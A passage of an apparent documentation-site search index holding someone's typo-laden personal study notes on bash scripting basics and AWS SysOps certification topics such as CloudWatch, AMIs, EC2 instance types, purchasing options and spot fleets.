job into bacgorund break Exist the current loop continue resumes the current loop eval eavluates the current exper exit quits the shell export Makes a variable of fucrtiosn avaible to other proggrams that are exexuted frome the shell fg bringas getopts Parsees Arguments to shell scripts jobs lsit bacground processes readonly declers a varaible as readonly shift move the scrpits input paramiters to the left droppin th firs paramter (usefull for consuming all aprameters one at a time) times Prints the user system time trap Traps a signal so the scipt can handleit (unhandeld signals termiante the script) unset deletes values from variables or funtion wait waits for a bacground process to complete <p>[!quote] She-bang bash_MAIN</p>"},{"location":"docs/scriptss/Scheduling_Scripts/","title":"Scheduling Scripts","text":"<ul> <li>At</li> <li>Cronetab</li> <li>Systemd Timers</li> </ul>"},{"location":"docs/scriptss/She-bang/","title":"She-bang","text":""},{"location":"docs/scriptss/She-bang/#she-bang","title":"She-bang","text":"<p>The sign #! is called She-bang and is written at top of the script. #alt-name Hasch-bang - It passes instruction to program /bin/sh. &gt; [!example] &gt; #!/bin/bash echo Hello World  </p>"},{"location":"docs/scriptss/She-bang/#binksh","title":"!/bin/ksh","text":"<p>echo Hello World</p> <p>[quote!]</p>"},{"location":"docs/scriptss/Standard_Error/","title":"Standard Error","text":""},{"location":"docs/scriptss/Standard_Error/#standard-error","title":"Standard Error","text":"<p>Output that produces an error 2 constiudes standard error &amp; constitutes for both &gt;[!quote] exit code, devnull</p>"},{"location":"docs/scriptss/Standard_input/","title":"Standard input","text":""},{"location":"docs/scriptss/Standard_input/#standard-input","title":"Standard Input","text":"<p>Its the third type of Data Streams U have to store the value of read into Variables &gt;[!example]- &gt;echo \u201cEnter ure name\u201d &gt;read myname &gt;echo \u201cYour name is: $myname\u201d</p>"},{"location":"docs/scriptss/Standard_output/","title":"Standard output","text":""},{"location":"docs/scriptss/Standard_output/#standard-output","title":"Standard output","text":"<p>Output that is printed to the screen that does not constitiutes Standard Error 2 Constitutes for Standard Output &amp; Constitutes for both &gt;[!quote] devnull find</p>"},{"location":"docs/scriptss/Variables/","title":"Variables","text":""},{"location":"docs/scriptss/Variables/#variables","title":"Variables","text":"<p>To decleare variable: LOL=\u201cxd\u201d To refrence a variable u have to add $ : echo $LOL IMPORTANT! Statment in \u2019\u2019 pritnts the variable name  - This avoids the collision with possible commands - also $ worsk similar to an f string &gt;[!example]- &gt;#!/bin/bash myname=\u201cJay\u201d myage: 40 echo \u201cHello, my name is $myname\u201d echo \u201cIm $myage &gt;&gt;[!tip]- Result &gt;&gt; Hello, my name is Jay Im 40 years old ## Sub-shell **It allows to execute command in the background** Variables can also nested otuputs of the functions **variable=$(command)**</p> <p>[!example]- files=$(ls) echo files &gt;[!tip]- Result &gt;360px-Sweden_in_European_Union.svg.png bash-test bookmarks.sh books dzieniczek.pdf dzienik.pdf For International &gt;</p>"},{"location":"docs/scriptss/Variables/#constans","title":"Constans","text":"<p>Variables like $USER are constants - env gives u a list of all envairomental variables!  - TO add somthitn to the PATH\u2005*\u2005exportPATH\u2004=\u2004/user/local/bin:PATH*</p> <ul> <li>To delete Varaible use unset</li> </ul>"},{"location":"docs/scriptss/command/","title":"command","text":"<p>is a varaible of itsel command - p - run the commnad commnad -v show the path to the command</p>"},{"location":"docs/scriptss/devnull/","title":"devnull","text":""},{"location":"docs/scriptss/devnull/#devnull","title":"/dev/null","text":"<p>Linux balck hole Evertything moved here will be wiped out!</p> <p>[!quote] find</p>"},{"location":"docs/scriptss/exit_code/","title":"exit code","text":""},{"location":"docs/scriptss/exit_code/#exit-code","title":"exit code","text":"<p>echo $? prints a code of an error of the last command - if code is equal to 0 the command whats succesful - if you set the Variables to exit (number) this will fore the exit code to be the number - if u add it to the function it will end the Functions &gt;[!example]- &gt; </p> <p>[!quote] U can redirect the wrong outpu to the devnull Standard Error Data Streams</p>"},{"location":"docs/scriptss/while_loop_bash/","title":"while loop_bash","text":""},{"location":"docs/scriptss/while_loop_bash/#while-loop","title":"While loop","text":"<p>while read while Variables do echo do smth sleep 0.5 done</p> <pre><code># Better use of the while loopp\nwhile read -r s; do echo $s; done &lt; servers\n</code></pre>"},{"location":"docs/sysops_aws_cert/ALBvsNLB/","title":"ALB vs NLB","text":""},{"location":"docs/sysops_aws_cert/ALBvsNLB/#application-load-balancerlevel-7","title":"Application Load Balancer(level 7)","text":"<p>it balances incoming http request - Routes traffic based of the content of the request - Built in health checks - it can route away the traffic form unhealthy targets - Contenerize support - Can route traffic to ECS and EKS(amazon Container and Kubernetess service) - SSL offloading</p>"},{"location":"docs/sysops_aws_cert/ALBvsNLB/#network-load-baleancerlevel-4","title":"Network Load Baleancer(level 4)","text":"<p>It balances the entire connection - Designed for high perofmence and can handle milion request per second - Corss-zone load balancing - Automatically distribute traffic among AZ\u2019s \u2014 Layer 7 Firewalls</p>"},{"location":"docs/sysops_aws_cert/CloudWatch/","title":"CloudWatch","text":"<ul> <li>It\u2019s an umbrella service<ul> <li>Collection of the monitoring tools</li> <li>Logs() Any custom log data, <code>Application Logs</code>,<code>Lambda Logs</code></li> <li>Metrics Variable in time u wanna monitor <code>cpu usge</code> or     <code>memory usage</code></li> <li>Amazon Event Bridge/Cloud watch events Trigger event based     on the condition (every our snapshot the server)</li> <li>Alarms trigger notification based on metric which breach a     defined threshold</li> <li>Dashboard Creates the visualization based on metrics</li> <li>Service Lens Visualize and analyze the     health,performance,availability in a signed place(smth like     summery)</li> <li>Container Insights Logs containerized apps and micro     services</li> <li>Synthetics Test web apps to if they\u2019re broken</li> <li>Contributor insights view the top contributions impacting     the performance of your systems and application in real time</li> </ul> </li> </ul>"},{"location":"docs/sysops_aws_cert/CloudWatch/#cloud-watch-integrations","title":"Cloud watch integration\u2019s","text":"<ul> <li> <p>S3 U can export logs to S3 do perform analysis</p> </li> <li> <p>Security By default log groups are encrypted using SSE</p> </li> <li> <p>Log filtering Logs can be filtered using Filtering     syntax</p> </li> <li> <p>Log retention By default logs never expire You can adjust     the retention policy for each log group(from 1 day to 10 years)</p> </li> </ul>"},{"location":"docs/sysops_aws_cert/CloudWatch/#log-groups","title":"Log groups","text":"<p>A collection of log streams.</p> <p>\u201c/test/prod/app\u201d \u201c/test/prod/db\u201d \u201c/test/dev/db\u201d</p>"},{"location":"docs/sysops_aws_cert/CloudWatch/#log-streams","title":"Log streams","text":"<ul> <li>Sequence of event for the same source</li> </ul>"},{"location":"docs/sysops_aws_cert/CloudWatch/#cloud-watch-logs-insights","title":"Cloud Watch Logs Insights","text":"<p>Interactively search and analyze u log date with the syntax - Supports all kinds of logs - Better then importing it locally and sent through [[Athena]] - Sing request can query up to 20 log groups - Queries time out after 15 minutes - Query results are available for 7 days</p>"},{"location":"docs/sysops_aws_cert/CloudWatch/#sample-queries","title":"Sample queries","text":"<ul> <li>Remember that aws provide a list of queries that u will usually just     need<ul> <li>All u have to do i to copy the syntax of the one u need It evens     create a little graph based on it</li> </ul> </li> </ul>"},{"location":"docs/sysops_aws_cert/CloudWatch/#discover-fields","title":"Discover fields(@)","text":"<p>It\u2019 analyze the log events and try to structure the content by generating fields that u can use in your query</p> <ul> <li>Five system fields (automatically generated)<ul> <li>@message Raw unparsed log event</li> <li>@timestamp</li> <li>@ingestionTime Time when the log was recived</li> <li>logStream the name of the log stream the event was added to</li> <li>@log Log group identifier</li> </ul> </li> </ul> <p></p> <p>Cloud watch for ec2 metrics</p>"},{"location":"docs/sysops_aws_cert/EBS/","title":"Amazon Elastic Block Store","text":"<p>Wiki</p> <p></p>"},{"location":"docs/sysops_aws_cert/Sysops_MAIN/","title":"Aws Sysops Certifcate","text":"<p>Definitely not Flash cards</p> <p>Course Link</p> <p></p> <p>CloudWatch</p> <p>Ec2instance</p>","tags":["Aws Sysop Certificate"]},{"location":"docs/sysops_aws_cert/waf_aws/","title":"Waf aws","text":"<p>Aware of the <code>OWSAP</code> top 10 and prevent those attacks natively </p> <p>Docs AWS WAF</p> <p>Layer 7 Firewalls</p>"},{"location":"docs/sysops_aws_cert/cloud_watch/cloud_watch_ec2/","title":"Cloud watch for EC2 metrics","text":"<p>Aws provided metrics (AWS pushes them) - Aws Provided Metrics - Metrics <code>CPU</code> <code>Network</code> <code>Disk</code> <code>Status check</code> - Baisic Monitoring <code>default</code>metrics are collected every 5 minutes - Detaild Monitoring <code>paid</code> metrics are collected every 5 minutes - Custom metrics - Baisic Resolution 1 minute - High Resolution: all the way to 1 second - inclued RAM, application metrics - make sure the IAM peromission on the EC2 instance role are correct</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/cloud_watch/cloud_watch_ec2/#inclueded-metrics","title":"Inclueded Metrics","text":"<ul> <li>CPU: CPU Utilization + Credit Usage / Balance</li> <li>Network: Network In / Out</li> <li>Status Check<ul> <li>Instance satus: check the EC2Vm</li> <li>System staus: check the underlying hardwer</li> </ul> </li> <li>Disk: Read/Write for Ops / Bytes (only for instance store)</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ami/","title":"Ami","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ami/#amazon-machine-image","title":"Amazon Machine Image","text":"<p>customization of Ec2instance</p> <p>aws marketplace - You add your own softweare configration etc .. - Faster boot because all softere is pre-backed - Ami are built for a sepcyfic regian (can be copeid across regions)</p> <p>All u ussualy need is to create the image and this will show the <code>ami</code> - AMI Procces( from an EC2 instance) 1. Start Ec2 instance and custimize it 2. Stop the instance 3. Build Ami (this also create the Ebs snapshots) 4. Launch instance from other AMI\u2019s</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ami/#no-reboot-option","title":"No-Reboot Option","text":"<p>create ami without shuting down the instance</p> <p><code>NOTE</code> By defualt this is not selected</p> <p>U may not have the file system integrity No reboot vs reboot you</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ami/#aws-backup-plans","title":"Aws Backup Plans","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ami/#this-wont-help-u-prserve-the-file-system-integrity","title":"this won\u2019t help u prserve the file system integrity","text":"<p><code>NOTE</code> It doesn\u2019t reboot the ec2 while doing the snapchot</p> To addres that u need to provide the reboot parameter while taking image | Defualt AMI backup(not shuting down) | Lambda setup backup (shuting down) | |\u2014\u2014\u2014\u2014\u2014\u2014|\u2014\u2014\u2014\u2014\u2014\u2014| |  |  | ## AMI in Production - You can force users to only launch EC2 instances from pre-approved AMI\u2019s using IAM policies - Combine with AWS config to find not complient EC2 instances(launched with non-approved AMIs)  ### Cross-Account AMI Sharing - You can share an AMI wiht another AWS account - Sharing AMI does not affect the ownership - U can only hsare AMI\u2019s with - unencrypted volumes - voulems encrypted with the customer key - u need to share the key #### Cross-Account AMI Copy - When copy the shared AMI u become the owner - The source owner must grant u read perrmisions for the storages that backs the AMI - If encrypted then must have a key - Can ecnrytp the AMI with your own CMK while copying  <ul> <li> <p>[Ec2 Builder]({{\\&lt; ref     \u201cposts/sysops_aws_cert/ec2_instances/ec2_image_builder.md\u201d&gt;}})</p> </li> <li> <p>Ec2instance</p> </li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/aws_outposts/","title":"Aws Outposts","text":"<p>Allow to run aws ifrastructure on your own data center Aws Docs</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_image_builder/","title":"ec2 image builder","text":"<p>Used to automate the creation of Vms and containers</p> <ul> <li>Automate creation ,maintain, validate, test</li> <li>Free service (only pay for the instance)</li> <li>Can be run on the schedule </li> </ul> <ul> <li>AMI</li> <li>Ec2instance</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/","title":"Ec2 instance","text":"<p>The defult user for aws is the <code>ec2-user</code> ## Changing the type</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#amazon-ebs-optimized-instances","title":"Amazon EBS-Optimized Instances","text":"<p>Are set up to work really well with Amazon Elastic Block Store (EBS)</p> <p>Aws Docs</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#user-data","title":"User data","text":"<p>it contains a scirpt that starts at the start of the instance</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#amis","title":"Amis","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#enhanced-networking","title":"Enhanced Networking","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#ec2-enhanced-networking-sr-iov","title":"EC2 Enhanced Networking (SR-IOV)","text":"<p>Works for newer generation EC2 Instances - Benefits - Higher bandwith - Higher PPS(packet per second) - Lower latency</p> <ul> <li>Options<ul> <li><code>Elastic Network Adapter (ENA)</code><ul> <li>Up to 100Gbps</li> </ul> </li> <li><code>Intel VF</code><ul> <li>Up to 10Gps LEGACY!</li> </ul> </li> </ul> </li> </ul> <pre><code># To check weather this mode is present \nmodinfo ena \n# Then check what dirver the eth iterface is using \nethtool -i eht0 \n</code></pre>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#elastic-fabric-adapterefa","title":"Elastic Fabric Adapter(EFA)","text":"<p>Great for high-performence compiuting(HPC) - Improved <code>ENA</code> for HPC, only works with Linux - Great for inter-node communication ,thightly copuled worklods #kubernetes - Message Passing Interface (MPI) standard - Bypasses the underlying Linux Os - low-latency - relaibe transport</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#placements-groups","title":"Placements Groups","text":"<p>Sometimes you wnat control over the instance placement strategy - During creation u can specyfie one of the strategies - Cluster - Spread - Partition</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#shutdown-behavior","title":"Shutdown Behavior","text":"<p>How shoud the instace reacte when shutdown is done - <code>Stop</code>(default) - <code>Terminate</code> - <code>Hiberante</code> - The in-memory (RAM) state is preserverd - The instace boot fastert(the OS is not stopped/restarted)</p> <p>AWSConsole Attribute: <code>InstanceInitiatedShutdownBehavior</code> - This attribute determines the behavior of the instance when it is shut down from within the operating system. - Important Note: - You can only modify this attribute from inside the instance. - Exiting from the console does not affect this setting. Here\u2019s a revised version of your text regarding Termination Protection:</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#termination-protection","title":"Termination Protection","text":"<p>This protection works only if u want to <code>terminate from console</code>or <code>CLI</code>  - Overview: If an instance has its shutdown behavior set to <code>terminate</code> and <code>termination protection</code> is enabled - Shutting down the instance from the operating system will still result in the instance being terminated.</p> <ul> <li>Important Note: This occurs because the shutdown action is     initiated from within the operating system, rather than through     the AWS Management Console.</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#trouble-shoot","title":"Trouble shoot","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#error-types","title":"Error Types","text":"<ul> <li><code>#InstanceLimitExeeded</code><ul> <li>Reached the max limit of the <code>vCPU</code> per region</li> <li>On-Demand instance limits are set on a per-region baisis<ul> <li>By defult with On-Demand     (A,C,D,H,I,R,T,Z)     instance types you\u2019ll have <code>64vCPUs</code></li> </ul> </li> <li>Resolution: Launch in diffrent region or request limit     increase in given region<ul> <li>U can find inormation is either to check <code>quota</code> or direcly     the instacne limits or direcly the <code>instance limits</code></li> </ul> </li> </ul> </li> <li><code>#InsufficientInstacneCapicity</code><ul> <li>Aws does not have enough On-Demand capicity in the particular AZ<ul> <li>Its the Aws issue so either wait change the Az resize or     choose different type</li> </ul> </li> </ul> </li> <li><code>#InstanceTerminatesImmediately</code>(goes from pedning straight to     terminated)<ul> <li>Reached EBS volume limit</li> <li><code>EBS</code> snapshot is corrupt</li> <li>The root <code>EBS</code> voulume is encrypted and u don\u2019t have     permissions</li> <li>Your missing a requierd part of configuration</li> <li>Resolution: Check out the Description inside the     <code>EC2 console</code></li> </ul> </li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#ssh-vs-ec2-connector","title":"SSH Vs Ec2 connector","text":"<p>You can\u2019t connect to the EC2 instance in the browser using your local IP address. Instead, you need to:</p> <p>AWS Docs 1. Find the <code>EC2_INSTANCE_CONNECT</code> IP range for the specific region you are using. 2. Add this IP range to your allowed IP lists.</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_instance/#purchasing-options","title":"Purchasing options","text":"<p>Ec2 purchasing options</p> <ul> <li>SSM</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/","title":"EC2 Purchasing Options","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#ec2-purchasing-options","title":"EC2 Purchasing Options","text":"Pricing Model Workload Type Payment Structure Discounts Available Commitment Period On-Demand Short workloads Pay by the second None None Reserved Long workloads No Upfront, Partial, All Upfront Up to 72% 1 or 3 years Convertible Reserved Instances Long workloads Flexible Up to 66% 1 or 3 years Savings Plans Long workloads Based on usage Up to 72% 1 or 3 years Spot Instances Short workloads Pay as per spot price Up to 90% None Dedicated Hosts Full server usage On-Demand or Reserved None None Dedicated Instances Dedicated hardware N/A None None Capacity Reservations Reserved capacity Pay for reserved capacity None None","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#on-demand","title":"On-Demand","text":"<p>Short workload, pay by the second.</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#characteristics","title":"Characteristics:","text":"<ul> <li>Linux or Windows</li> <li>Billing per second</li> <li>Other OSes billing per hour</li> <li>High cost, no upfront payment</li> <li>No long-term commitment</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#reserved","title":"Reserved","text":"<p>Recommended for steady-state usage applications (e.g., databases). Best for long workloads (1 &amp; 3 years).</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#characteristics_1","title":"Characteristics:","text":"<ul> <li>You reserve specific instance attributes (Instance Type, Region, Tenancy, OS)</li> <li>Reserved Instances Scope:</li> <li>Regional or Zonal (reserve capacity in an AZ)</li> <li>You can buy or sell in the Reserved Instance Marketplace</li> <li>Reservation Period: </li> <li>1 year (discount)</li> <li>3 years (greater discount)</li> <li>Up to 72% discount compared to On-Demand</li> <li>Payment Options:</li> <li>No Upfront</li> <li>Partial Upfront</li> <li>All Upfront</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#convertible-reserved-instances","title":"Convertible Reserved Instances","text":"<p>Long workloads with flexible instance configurations. - Can change the EC2 instance OS family, scope, and tenancy - Up to 66% discount compared to On-Demand</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#savings-plans","title":"Savings Plans","text":"<ul> <li>Commit to usage in advance for 1 or 3 years </li> <li>Provides discounts for consistent usage</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#characteristics_2","title":"Characteristics:","text":"<ul> <li>Discount based on long-term usage (up to 72%)</li> <li>Commit to a specific level of spending ($10/hour for 1 or 3 years)</li> <li>Any usage beyond the committed amount is billed at the On-Demand price</li> <li>Locked to a specific:</li> <li>Instance family</li> <li>AWS region</li> <li>Flexible across:</li> <li>Instance size</li> <li>OS</li> <li>Tenancy (Host, Dedicated, Default)</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#spot-instances","title":"Spot Instances","text":"<p>Instances that can be lost if the max price is less than the current spot price.</p> <p>Learn more about Spot Instance mechanisms.</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#characteristics_3","title":"Characteristics:","text":"<ul> <li>Short workloads</li> <li>Very cheap (up to 90% discount compared to On-Demand)</li> <li>Less reliable (instances can be interrupted)</li> <li>Best for workloads that are fault-tolerant, such as:</li> <li>Distributed workloads</li> <li>Jobs with a flexible start and end time</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#dedicated-hosts","title":"Dedicated Hosts","text":"<p>Book an entire physical server dedicated to your use.</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#characteristics_4","title":"Characteristics:","text":"<ul> <li>Full EC2 server capacity dedicated to you</li> <li>Control instance placements</li> <li>Payment options:</li> <li>On-Demand</li> <li>Reserved</li> <li>Related AWS service: AWS Outposts</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#dedicated-instances","title":"Dedicated Instances","text":"<p>Instances that run on hardware dedicated to a single customer, but not an entire server.</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#characteristics_5","title":"Characteristics:","text":"<ul> <li>The physical server is not fully dedicated to you, but the instances are</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#capacity-reservations","title":"Capacity Reservations","text":"<p>Reserve On-Demand instance capacity in a specific AZ for any duration.</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ec2_purches_options/#characteristics_6","title":"Characteristics:","text":"<ul> <li>Guarantees EC2 capacity availability whenever needed</li> <li>No long-term commitment (can create/cancel any time)</li> <li>No billing discount (regular On-Demand pricing)</li> <li>Can be combined with Regional Reserved Instances and Savings Plans for billing discounts</li> <li>Good for short-term uninterrupted workloads that must run in a specific Availability Zone (AZ)</li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/elastic_ip/","title":"Elastic IPs","text":"<p>If you need a fixed ip (defualt is 5 adresses) - When reastarting the Ec2 instance changes it\u2019s IP - It\u2019s public as long as u don;t delete it - Atach to one instance at a time time - You can rememap it across instances - Don\u2019t pay for elastic ip if attached to the server - U pay if it\u2019s not attached to the server</p>"},{"location":"docs/sysops_aws_cert/ec2_instances/instance_families/","title":"Instance Types","text":"<p>(A, C, D, H, I, R, T, Z) refer to different families of instance types, each optimized for specific use cases</p> <p>Aws Docs</p> <ol> <li> <p>A (General Purpose): - These instances provide a balance of     compute, memory, and networking resources. They are suitable for a     variety of workloads, including small and mid-sized databases, data     processing tasks, and web servers.</p> </li> <li> <p>C (Compute Optimized):</p> <ul> <li>These instances are designed for compute-intensive applications.     They provide high-performance processors and are ideal for tasks     such as high-performance web servers, batch processing, and     scientific modeling.</li> </ul> </li> <li> <p>D (Dense Storage):</p> <ul> <li>These instances are optimized for workloads that require high     disk throughput and large amounts of storage. They are suitable     for data warehousing, Hadoop distributed computing, and other     data-intensive applications.</li> </ul> </li> <li> <p>H (High Memory):</p> <ul> <li>These instances are optimized for memory-intensive applications.     They provide a high ratio of memory to vCPUs and are ideal for     in-memory databases, big data analytics, and high-performance     computing (HPC) applications.</li> </ul> </li> <li> <p>I (I/O Optimized):</p> <ul> <li>These instances are designed for applications that require high     input/output operations per second (IOPS). They are suitable for     NoSQL databases, data warehousing, and other applications that     require fast access to large datasets.</li> </ul> </li> <li> <p>R (Memory Optimized):</p> <ul> <li>These instances are optimized for memory-intensive applications,     providing a high amount of RAM relative to vCPUs. They are ideal     for applications such as in-memory databases, real-time big data     analytics, and high-performance computing.</li> </ul> </li> <li> <p>T2/T3 (Burstable Performance):</p> <ul> <li>These instances provide a baseline level of CPU performance with     the ability to burst to higher levels when needed.</li> <li>If the machine bursts, it uses <code>burst credits</code> -They are     suitable for applications with variable workloads, such as web     servers and development environments. If CPU credits are     exhausted beyond the <code>burst level</code>, then the CPU performance     will slow down to the baseline level. </li> </ul> </li> <li> <p>U can setup the unilited but be cerfull</p> <ul> <li>U pay extra money when over the credit balance</li> <li>U pay for additional <code>vCPU/h</code> if the <code>avarge cpu usage</code> over     24h exceeds the baseline</li> </ul> </li> <li> <p>Z (High Performance Computing):</p> <ul> <li>These instances are designed for high-performance computing     applications that require significant computational power. They     are suitable for workloads such as simulations, financial     modeling, and scientific computing. \u2014 bash     Ec2instance</li> </ul> </li> </ol> <pre><code>perl -p -i -e ''\n</code></pre>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/placement_groups/","title":"Placement groups","text":"<p>This is similar to the Raid Levels ## Cluster Clusters instances into a low-latency group in a single Avalibility zone  - Infra - Same Rack(same hardwere) - Same AZ(avalibility zone) - Pros - Greate network(10Gbps bandwith between instances) - Cons - If the rack fails, all instances fail.</p> <ul> <li>Use case:<ul> <li>Big Data Job that need to complete fast</li> <li>App that needs extremely low     latency and high network     throughput</li> </ul> </li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/placement_groups/#spread","title":"Spread","text":"<p>Spreads instances across underlying hardwere (Max 7 instace per group per AZ) #CriticalApps </p> <ul> <li>Pros<ul> <li>Can span accross AZ</li> <li>Reduce simultaneous failure</li> </ul> </li> <li>Cons<ul> <li>Only 7 instances</li> </ul> </li> <li>Use Case<ul> <li>Aplication that maximzie high avalibility</li> <li>Each instance has to be isolated form faileur from each other     ### Can Operate on racks and hosts Aws host     outputs</li> </ul> </li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/placement_groups/#partition","title":"Partition","text":"<p> Spreads accrros many diffrent partiction (relay on diffrent sets of racks) - Scales to 100 EC2 instaces per gorup (Kafka,Cassandra) - a partition failure can affect many EC2 but won\u2019t affect otehr partitions - EC2 instance get access to the partition metadata - Use cases - Kafka, Cassandra</p> <p>Ec2instance</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/spot_fleets/","title":"Spot fleets","text":"<p>Allows to automaticly reqest spot instances with the lowest price</p> <p>Set of Spot Instance + On-demand(optional) - The Spot Fleet will try to meet the tartget capacity with the price constrains - Define possible lauhch pools (instance,type OS, AZ) - Can have multiple lauhhc pools so the the fellt can choose - Spot Fleet stops lauchning isntances when reacheing capoacity or max cost</p> <ul> <li>Strategies<ul> <li><code>lowestPrice</code><ul> <li>from the pool with the lowest price (cost optimatizaiotin,     shork worklaod)</li> </ul> </li> <li><code>diversified</code><ul> <li>distribiuted accros all pools (great availibility,long     workloads)</li> </ul> </li> <li><code>capacityOptimized</code><ul> <li>pool with the optimal capacit for the number of instances</li> </ul> </li> <li><code>priceCapacityOptimized</code>(recommended)<ul> <li>pools with the highest capcaity avaialble<ul> <li>then select the pools wiht the lowest price</li> </ul> </li> </ul> </li> </ul> </li> </ul>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/spot_instance_mechanism/","title":"Spot instance mechanism","text":""},{"location":"docs/sysops_aws_cert/ec2_instances/spot_instance_mechanism/#spot-pricing-guidelines","title":"Spot Pricing Guidelines","text":"<ol> <li> <p>Define Max Spot Price     Set a maximum spot price and acquire the instance while the current     spot price is less than your defined maximum.</p> <ul> <li>The hourly spot price varies based on demand and capacity.</li> <li>If the current spot price exceeds your maximum price, you have     the option to either stop or terminate the instance.<ul> <li>Grace Period: 2 minutes.</li> </ul> </li> </ul> </li> </ol> <p>This show weather the price rises above the max jprice that we defined </p>"},{"location":"docs/sysops_aws_cert/ec2_instances/spot_instance_mechanism/#spot-fleets","title":"Spot Fleets","text":"<p>The Spot Fleet will try to meet the tartget capacity with the price constrains</p>"},{"location":"docs/sysops_aws_cert/ec2_instances/spot_instance_mechanism/#spot-block-no-longer-supported","title":"Spot Block (No Longer Supported)","text":"<ul> <li> <p>Block Spot Instance     You can block a spot instance during a specified time frame of up to     6 hours without interruptions.</p> <ul> <li>In rare situations, the instance may be reclaimed.</li> </ul> </li> </ul>"},{"location":"docs/sysops_aws_cert/ec2_instances/spot_instance_mechanism/#terminating-spot-instance","title":"Terminating spot instance","text":"<p>Aws wont termiante the spot instance u have to do it mannualy &gt; - You can only cance Spot instance request ath are <code>open</code>, <code>active</code> or <code>disabled</code>. 1. Cancel the Spot Reuqest 2. Terminatne the assosciated Spot instnaces</p> <p>BUG: If you were to do it the other way around, the spot request will spawn it again.</p> <ul> <li>Purches     options</li> <li>ec2</li> </ul>"},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/","title":"SSM","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/#aws-systems-manager-overview","title":"AWS Systems Manager Overview","text":"<p>free service needs to be instaled onot the system we contole - Menage Ec2 and On-Premises systems and scale - It shows the instance in a Fleet Manager - U dont have to open any ports - Installed by defualt on Amazon Linux 2 - U just have to add a AmazonSSMMangegedInstanceCore - Get operationa insight about the sate fo your infrasturcture - Patching automation for enhanced compliance - Works with windows and linux - Integraded with Clouwatch metric/dashbaords - Integrated wit <code>AWS Config</code></p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/#ssm-documentsa","title":"SSM Documentsa","text":"<p>baisicly a playbooks Ansible and ssm integration  - Written in json or yaml - define the paramters and actions</p>","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/#ssm-automation","title":"SSM Automation","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/#ssm-with-ansible","title":"SSM with ansible","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/#aws-system-menager-features","title":"AWS System Menager Features","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/#paramater-sotre","title":"Paramater sotre","text":"","tags":["ec2"]},{"location":"docs/sysops_aws_cert/ec2_instances/ssm_main/SSM/#ssm-inventory","title":"Ssm 